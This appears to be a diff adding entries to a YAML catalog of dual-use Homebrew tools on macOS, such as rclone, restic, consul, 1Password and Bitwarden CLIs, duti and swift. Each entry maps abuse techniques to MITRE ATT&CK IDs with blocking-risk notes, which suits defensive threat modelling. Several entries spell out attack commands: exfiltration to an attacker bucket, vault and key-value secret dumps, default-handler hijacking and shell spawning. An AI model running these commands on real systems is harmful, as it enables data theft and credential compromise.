+    abuse_techniques:
+      - technique: "File encryption for exfiltration"
+        mitre: "T1027"
+        description: "age -r <recipient> -o encrypted.age sensitive.txt encrypts data for exfiltration, evading content inspection"
+      - technique: "SOPS integration for secret access"
+        mitre: "T1552.001"
+        description: "age is commonly used with Mozilla SOPS for encrypting secrets in Git repos. Access to age keys decrypts all repository secrets"
+    blocking_risk: low
+    why_hard_to_block: "Growing adoption for secrets management (SOPS, age-encrypted dotfiles). Simpler than GPG."
+    references:
+      - "https://attack.mitre.org/techniques/T1027/"
+
+  - name: consul
+    install: homebrew  # hashicorp consul
+    prevalence: moderate
+    description: "HashiCorp Consul — service mesh, service discovery, and KV store"
+    abuse_techniques:
+      - technique: "KV store secret extraction"
+        mitre: "T1552.001"
+        description: "consul kv get -recurse / dumps all key-value pairs, which often contain application secrets and configuration"
+      - technique: "Service catalog reconnaissance"
+        mitre: "T1018"
+        description: "consul catalog services and consul members enumerate all registered services and cluster nodes"
+      - technique: "Exec for remote command execution"
+        mitre: "T1059"
+        description: "consul exec 'whoami' executes commands across all Consul agent nodes (if exec is enabled)"
+      - technique: "ACL token theft"
+        mitre: "T1528"
+        description: "Consul ACL tokens cached locally grant API access. consul acl token list enumerates tokens if master token is available"
+    blocking_risk: moderate
+    why_hard_to_block: "Central service discovery in microservices architectures. Blocking it disrupts service mesh and health checking."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+
+  - name: packer
+    install: homebrew  # hashicorp packer
+    prevalence: moderate
+    description: "HashiCorp Packer — automated machine image building"
+    abuse_techniques:
+      - technique: "Shell provisioner execution"
+        mitre: "T1059.004"
+        description: "Packer templates execute shell provisioners that run arbitrary commands during image builds"
+      - technique: "Backdoored image creation"
+        mitre: "T1195.002"
+        description: "packer build creates VM/container images. Malicious templates produce backdoored golden images that propagate across infrastructure"
+      - technique: "Cloud credential access"
+        mitre: "T1552.001"
+        description: "Packer templates contain cloud provider credentials for image publishing (AWS AMI, GCP Image, Azure VM Image)"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard tool for creating machine images in CI/CD pipelines"
+    references:
+      - "https://attack.mitre.org/techniques/T1059/004/"
+
+  - name: k9s
+    install: homebrew
+    prevalence: common
+    description: "Terminal UI for Kubernetes cluster management"
+    abuse_techniques:
+      - technique: "Shell into pods"
+        mitre: "T1059.004"
+        description: "k9s provides interactive shell access to any pod via its TUI, making lateral movement through Kubernetes more efficient"
+      - technique: "Secret viewing"
+        mitre: "T1552.001"
+        description: "k9s decodes and displays Kubernetes secrets in plaintext through its interface"
+      - technique: "Resource manipulation"
+        mitre: "T1578"
+        description: "k9s allows editing, deleting, and creating Kubernetes resources through its interface"
+    blocking_risk: low
+    why_hard_to_block: "Popular Kubernetes management tool. Functionally equivalent to kubectl but with TUI."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+
+  - name: lazydocker
+    install: homebrew
+    prevalence: moderate
+    description: "Terminal UI for Docker and Docker Compose management"
+    abuse_techniques:
+      - technique: "Container shell access"
+        mitre: "T1059.004"
+        description: "lazydocker provides exec shell into any running container through its TUI"
+      - technique: "Container configuration viewing"
+        mitre: "T1552.001"
+        description: "Displays environment variables and configuration of running containers that may contain secrets"
+    blocking_risk: low
+    why_hard_to_block: "Convenience tool for Docker management. Same capabilities as docker CLI."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/004/"
+
+  - name: act
+    install: homebrew
+    prevalence: moderate
+    description: "Run GitHub Actions locally — executes workflow YAML files"
+    abuse_techniques:
+      - technique: "Workflow execution"
+        mitre: "T1059"
+        description: "act runs GitHub Actions workflows locally, executing arbitrary commands defined in workflow YAML including run: steps"
+      - technique: "Secret access via environment"
+        mitre: "T1552.001"
+        description: "act --secret-file .secrets loads secrets from files and injects them as environment variables during workflow execution"
+      - technique: "Container-based code execution"
+        mitre: "T1059"
+        description: "act runs workflows inside Docker containers, executing code from referenced actions without review"
+    blocking_risk: low
+    why_hard_to_block: "Used by developers to test CI/CD pipelines locally before pushing"
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+
+  - name: step
+    install: homebrew  # step-cli / smallstep
+    prevalence: moderate
+    description: "Smallstep CLI — certificate management and PKI operations"
+    abuse_techniques:
+      - technique: "Certificate authority impersonation"
+        mitre: "T1587.003"
+        description: "step certificate create generates certificates. step ca init creates a full CA, enabling TLS interception with trusted certificates"
+      - technique: "OAuth/OIDC token manipulation"
+        mitre: "T1528"
+        description: "step crypto jwt creates and decodes JWTs. step oauth issues OIDC tokens for identity impersonation"
+      - technique: "SSH certificate generation"
+        mitre: "T1098.004"
+        description: "step ssh certificate generates SSH certificates that may be trusted by hosts configured with step-ca"
+    blocking_risk: low
+    why_hard_to_block: "Used for internal PKI management and certificate automation"
+    references:
+      - "https://attack.mitre.org/techniques/T1587/003/"
+
+  - name: teleport
+    install: homebrew  # tsh (Teleport client)
+    prevalence: moderate
+    description: "Gravitational Teleport client (tsh) — unified access plane for SSH, Kubernetes, databases"
+    abuse_techniques:
+      - technique: "Credential cache exploitation"
+        mitre: "T1528"
+        description: "tsh stores certificates in ~/.tsh/ that grant SSH, Kubernetes, and database access. Certificate theft enables impersonation"
+      - technique: "Multi-protocol lateral movement"
+        mitre: "T1021"
+        description: "tsh ssh, tsh kube, tsh db provide authenticated access to SSH servers, Kubernetes clusters, and databases through a single tool"
+      - technique: "Session recording bypass"
+        mitre: "T1562"
+        description: "tsh proxy enables direct connections that may bypass Teleport's audit logging when misconfigured"
+    blocking_risk: moderate
+    why_hard_to_block: "Access management tool replacing direct SSH. Blocking it locks users out of production infrastructure."
+    references:
+      - "https://attack.mitre.org/techniques/T1021/"
+
+  - name: 1password-cli
+    install: homebrew  # 1password-cli cask (op command)
+    prevalence: common
+    description: "1Password CLI (op) — command-line access to 1Password vaults"
+    abuse_techniques:
+      - technique: "Vault secret extraction"
+        mitre: "T1555"
+        description: "op item list / op item get dumps passwords, API keys, and secrets from all accessible 1Password vaults"
+      - technique: "Session token theft"
+        mitre: "T1528"
+        description: "op signin creates session tokens. OP_SESSION_* environment variables can be stolen from process environment"
+      - technique: "Credential injection into processes"
+        mitre: "T1552.001"
+        description: "op run injects secrets as environment variables into processes. Attacker can intercept these via /proc or process inspection"
+    blocking_risk: high
+    why_hard_to_block: "Organizations use op for secrets management in CI/CD and development workflows. Blocking it breaks credential injection pipelines."
+    macos_specific_notes: "On macOS, op integrates with Touch ID for biometric authentication. Session tokens are time-limited but powerful while valid."
+    references:
+      - "https://attack.mitre.org/techniques/T1555/"
+
+  - name: bitwarden-cli
+    install: homebrew  # bitwarden-cli formula (bw command)
+    prevalence: moderate
+    description: "Bitwarden CLI (bw) — command-line access to Bitwarden password vaults"
+    abuse_techniques:
+      - technique: "Vault export"
+        mitre: "T1555"
+        description: "bw export --format json dumps the entire password vault contents to a file"
+      - technique: "Session key theft"
+        mitre: "T1528"
+        description: "BW_SESSION environment variable contains the unlock key. Process environment inspection reveals it"
+      - technique: "Item enumeration"
+        mitre: "T1555"
+        description: "bw list items enumerates all stored credentials, secure notes, and identity information"
+    blocking_risk: moderate
+    why_hard_to_block: "Password manager CLI for development automation and CI/CD credential injection"
+    references:
+      - "https://attack.mitre.org/techniques/T1555/"
+
+  - name: duti
+    install: homebrew
+    prevalence: moderate
+    description: "macOS default application handler setter — assigns file type associations"
+    abuse_techniques:
+      - technique: "Default handler hijacking"
+        mitre: "T1546"
+        description: "duti -s com.attacker.app .txt all sets a malicious application as the default handler for file types, achieving execution when users open those files"
+      - technique: "URL scheme hijacking"
+        mitre: "T1546"
+        description: "duti -s com.attacker.app https sets a malicious app as the default browser/URL handler"
+    blocking_risk: low
+    why_hard_to_block: "Used in macOS system configuration and dotfile management scripts"
+    macos_specific_notes: "macOS-specific tool that modifies LaunchServices database. No Linux equivalent."
+    references:
+      - "https://attack.mitre.org/techniques/T1546/"
+
+  - name: trash
+    install: homebrew  # trash-cli or macos-trash
+    prevalence: moderate
+    description: "Move files to macOS Trash instead of permanent deletion"
+    abuse_techniques:
+      - technique: "Anti-forensic file deletion"
+        mitre: "T1070.004"
+        description: "trash provides a way to delete files that appears benign (moves to Trash) but combined with 'empty-trash' or scheduled Trash emptying, achieves permanent deletion"
+      - technique: "Log/evidence removal"
+        mitre: "T1070"
+        description: "Moves log files and forensic artifacts to Trash, appearing as normal user cleanup activity"
+    blocking_risk: low
+    why_hard_to_block: "Safe-delete alternative to rm. Blocking it is unusual and would force users to use rm."
+    macos_specific_notes: "macOS-specific: interacts with Finder Trash system"
+    references:
+      - "https://attack.mitre.org/techniques/T1070/004/"
+
+  - name: swift
+    install: homebrew  # swift toolchain, also Xcode
+    prevalence: common
+    description: "Swift compiler and REPL — Apple's systems programming language"
+    abuse_techniques:
+      - technique: "JIT code execution"
+        mitre: "T1059"
+        description: "swift -e 'import Foundation; Process.launchedProcess(launchPath:\"/bin/sh\",arguments:[\"-c\",\"id\"])' executes commands via Swift REPL"
+      - technique: "Framework access"
+        mitre: "T1059"
+        description: "Swift has native access to all macOS frameworks (Security, Foundation, AppKit), enabling Keychain queries, process manipulation, and UI automation"
+      - technique: "Compile offensive tooling"
+        mitre: "T1587.001"
+        description: "swiftc compiles native Mach-O binaries with full macOS API access. Tools compiled with Swift appear as legitimate macOS applications"
+      - technique: "Objective-C runtime interaction"
+        mitre: "T1055"
+        description: "Swift can call Objective-C runtime functions for method swizzling and runtime manipulation of running applications"
+    blocking_risk: moderate
+    why_hard_to_block: "Essential for macOS and iOS application development"
+    macos_specific_notes: "Swift has unparalleled access to macOS system frameworks. The Swift REPL can interact with Keychain, TCC database, and process management APIs directly."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+
+  - name: aria2c
+    install: homebrew  # aria2 formula
+    prevalence: moderate
+    description: "Multi-protocol download utility — HTTP, FTP, BitTorrent with segmented downloading"
+    abuse_techniques:
+      - technique: "High-speed payload download"
+        mitre: "T1105"
+        description: "aria2c supports segmented downloading with multiple connections, enabling fast payload staging and tool transfer"
+      - technique: "BitTorrent-based C2/exfiltration"
+        mitre: "T1071"
+        description: "aria2c's BitTorrent support enables data transfer over P2P protocols that are harder to monitor than HTTP"
+      - technique: "Metalink for multi-source download"
+        mitre: "T1105"
+        description: "Metalink support downloads from multiple mirrors simultaneously, providing redundancy for payload delivery"
+    blocking_risk: low
+    why_hard_to_block: "Used in download automation scripts and CI/CD pipelines for large file retrieval"
+    references:
+      - "https://attack.mitre.org/techniques/T1105/"
+
+  - name: rclone
+    install: homebrew
+    prevalence: common
+    description: "Cloud storage sync tool — rsync for cloud storage providers (40+ backends)"
+    abuse_techniques:
+      - technique: "Cloud storage exfiltration"
+        mitre: "T1537"
+        description: "rclone copy /sensitive remote:exfil-bucket/ exfiltrates data to any of 40+ cloud storage providers (S3, GCS, Azure Blob, Dropbox, etc.)"
+      - technique: "Encrypted exfiltration"
+        mitre: "T1048"
+        description: "rclone crypt wraps any backend with encryption, making exfiltrated data opaque to DLP and network inspection"
+      - technique: "Cloud credential access"
+        mitre: "T1552.001"
+        description: "~/.config/rclone/rclone.conf contains credentials for all configured cloud storage backends in plaintext or obfuscated form"
+      - technique: "Mount for persistent access"
+        mitre: "T1078"
+        description: "rclone mount mounts cloud storage as a local filesystem, enabling continuous data access and exfiltration"
+    blocking_risk: moderate
+    why_hard_to_block: "Used for cloud backup, data migration, and multi-cloud file management. Ransomware groups (e.g., Conti) have adopted rclone for exfiltration."
+    references:
+      - "https://attack.mitre.org/techniques/T1537/"
+      - "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-265a"
+
+  - name: tailscale
+    install: homebrew  # tailscale formula
+    prevalence: common
+    description: "Tailscale mesh VPN — WireGuard-based peer-to-peer networking"
+    abuse_techniques:
+      - technique: "Mesh VPN for covert networking"
+        mitre: "T1572"
+        description: "tailscale up connects the machine to a Tailscale network, creating encrypted peer-to-peer tunnels that bypass traditional network monitoring"
+      - technique: "Exit node for traffic routing"
+        mitre: "T1090"
+        description: "tailscale up --exit-node routes all traffic through another Tailscale node, enabling traffic laundering and geo-evasion"
+      - technique: "Network access sharing"
+        mitre: "T1021"
+        description: "Tailscale subnet routers and shared nodes can expose internal networks to attacker-controlled Tailscale accounts"
+    blocking_risk: moderate
+    why_hard_to_block: "Growing enterprise VPN solution. Uses DERP relays over HTTPS when direct connections fail, making it difficult to block at the network level."
+    references:
+      - "https://attack.mitre.org/techniques/T1572/"
+
+  - name: restic
+    install: homebrew
+    prevalence: moderate
+    description: "Fast, secure backup program with deduplication and encryption"
+    abuse_techniques:
+      - technique: "Encrypted data exfiltration"
+        mitre: "T1048"
+        description: "restic backup -r s3:attacker-bucket /sensitive/ creates encrypted, deduplicated backups to attacker-controlled cloud storage"
+      - technique: "Repository credential extraction"
+        mitre: "T1552.001"
+        description: "RESTIC_PASSWORD and RESTIC_REPOSITORY environment variables or restic key files contain backup encryption credentials"
+      - technique: "Legitimate-looking transfers"
+        mitre: "T1537"
+        description: "Backup traffic to S3/B2/Azure is expected, making restic exfiltration difficult to distinguish from legitimate backup operations"
+    blocking_risk: moderate
+    why_hard_to_block: "Legitimate backup tool. Blocking it prevents data protection workflows."
+    references:
+      - "https://attack.mitre.org/techniques/T1048/"
+
+  - name: minisign
+    install: homebrew
+    prevalence: moderate
+    description: "Simple, fast tool for cryptographic signatures"
+    abuse_techniques:
+      - technique: "Fake signature generation"
+        mitre: "T1553.002"
+        description: "minisign -G generates signing key pairs. Attacker-generated signatures can verify trojanized binaries if the verification key is substituted"
+    blocking_risk: low
+    why_hard_to_block: "Used for verifying software releases. Minimal abuse surface but relevant in supply chain attacks."
+    references:
+      - "https://attack.mitre.org/techniques/T1553/002/"
